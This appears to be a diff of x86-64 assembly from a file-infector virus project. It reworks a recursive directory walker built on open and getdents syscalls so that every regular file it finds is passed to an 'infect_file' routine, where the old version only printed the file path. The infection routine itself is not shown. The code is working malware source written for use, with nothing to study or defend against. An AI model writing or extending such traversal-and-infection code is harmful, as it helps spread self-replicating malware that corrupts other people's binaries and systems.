@@ -1,8 +1,3 @@
-%include "include_recur.s"
-
-section .text
-	global recursive
-
 
 str: db 10, 0,
 sle: db "/", 0,
@@ -20,16 +15,18 @@ sle: db "/", 0,
 recursive:
 	push rbp
 	mov rbp, rsp
-	push r8
-	sub rsp, BUFFSIZE
+	sub rsp, READ_DIR_BUFF_SIZE
 	;open:
 	mov r12, rdi			;  buff[4096]
-	mov rsi, 0			    ; O_RDONLY
-	mov rax, OPEN   	 	; open("", O_RDONLY);
-	syscall
-	mov r15, rax			; fd
 	cmp r12, 0
-	jle exit
+	jz recursive_exit
+	lea rdi, [r12 + pathBuffer]
+	mov rsi, 0			    ; O_RDONLY
+	mov rax, SYS_OPEN   	; open("", O_RDONLY);
+	syscall
+	cmp rax, 0
+	jl recursive_exit2
+	mov r15, rax			; fd
 	call ft_strlen
 	mov r8, rax
 	
@@ -37,12 +34,12 @@ recursive:
 	loop_dir:
 	mov rdi, r15		; fd
 	mov rsi, rsp		; buff[300]
-	mov rdx, BUFFSIZE	; 300
-	mov rax, GETDENTS
+	mov rdx, READ_DIR_BUFF_SIZE	; 300
+	mov rax, SYS_GETDENTS
 	syscall
 	mov r14, rax		; byte read
 	cmp rax, 0
-	jle exit
+	jle recursive_exit
 
 
 	; loop files
@@ -56,9 +53,9 @@ recursive:
 	lea rdi, [rsp + r13 + d_name]
 	call ft_strlen
 	add rax, r8
-	cmp rax, PATHBUFFSIZE - 2
+	cmp rax, PATH_BUFF_SIZE - 2
 	jge end_recur
-	lea rdi, [r12 + r8]
+	lea rdi, [r12 + pathBuffer + r8]
 	cmp byte [rdi - 1], '/'
 	jz slash_ok
 	mov byte [rdi], '/'
@@ -77,25 +74,37 @@ recursive:
 	add rdi, r13
 	mov al, byte [rsp + rdi - 1]
 	cmp rax, DT_REG
-	jz infect_file
+	jz recursive_infect_file
 	cmp rax, DT_DIR
 	jz true_start_recur
 	jmp end_recur
 
-	infect_file:
+	recursive_infect_file:
 
-	lea rdi, [r12]
-	call ft_strlen
-	mov rdx, rax
-	mov rdi, STDOUT
+;	lea rdi, [r12 + pathBuffer]
+;	call ft_strlen
+;	mov rdx, rax
+;	mov rdi, STDOUT
+;	lea rsi, [r12 + pathBuffer]
+;	mov rax, SYS_WRITE
+;	syscall
+;	mov rdi, STDOUT
+;	lea rsi, [rel str] 
+;	mov rdx, 1
+;	mov rax, SYS_WRITE
+;	syscall
+
+	push r14
+	push r13
+	push r12
+	push r8
+	lea rdi, [r12 + pathBuffer]
 	mov rsi, r12
-	mov rax, WRITE
-	syscall
-	mov rdi, STDOUT
-	lea rsi, [rel str] 
-	mov rdx, 1
-	mov rax, WRITE
-	syscall
+	call infect_file
+	pop r8
+	pop r12
+	pop r13
+	pop r14
 
 	jmp end_recur
 	true_start_recur:
@@ -123,7 +132,7 @@ recursive:
 	pop r14
 	pop r15
 	xor rdi, rdi
-	lea rdi, [r12 + r8]
+	lea rdi, [r12 + pathBuffer + r8]
 	
 	mov [rdi], byte 0
 
@@ -139,9 +148,10 @@ recursive:
 	jl files_loop
 	quit_files_loop:
 	jmp loop_dir
-	exit:
+	recursive_exit:
 		mov rdi, r15
-		mov rax, CLOSE
+		mov rax, SYS_CLOSE
 		syscall
+	recursive_exit2:
 		leave
 		ret
